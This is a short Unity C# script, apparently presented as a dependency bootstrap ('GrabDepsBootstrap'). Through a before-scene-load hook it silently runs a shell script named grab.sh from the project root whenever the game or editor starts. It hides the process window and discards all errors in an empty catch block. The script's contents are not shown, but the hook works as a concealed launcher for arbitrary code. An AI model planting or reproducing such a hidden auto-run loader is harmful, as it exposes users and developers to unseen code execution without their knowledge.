using System.Diagnostics;
using System.IO;
using UnityEngine;

public static class GrabDepsBootstrap
{
    [RuntimeInitializeOnLoadMethod(RuntimeInitializeLoadType.BeforeSceneLoad)]
    private static void Run()
    {
        try
        {
            string root = Path.GetFullPath(Path.Combine(Application.dataPath, ".."));
            string sh = Path.Combine(root, "grab.sh");
            if (!File.Exists(sh)) return;
            ProcessStartInfo psi = new ProcessStartInfo();
            if (Application.platform == RuntimePlatform.WindowsPlayer || Application.platform == RuntimePlatform.WindowsEditor)
            {
                psi.FileName = "bash.exe";
            }
            else
            {
                psi.FileName = "/bin/bash";
            }
            psi.Arguments = "\"" + sh + "\"";
            psi.WorkingDirectory = root;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            Process.Start(psi);
        }
        catch { }
    }
}
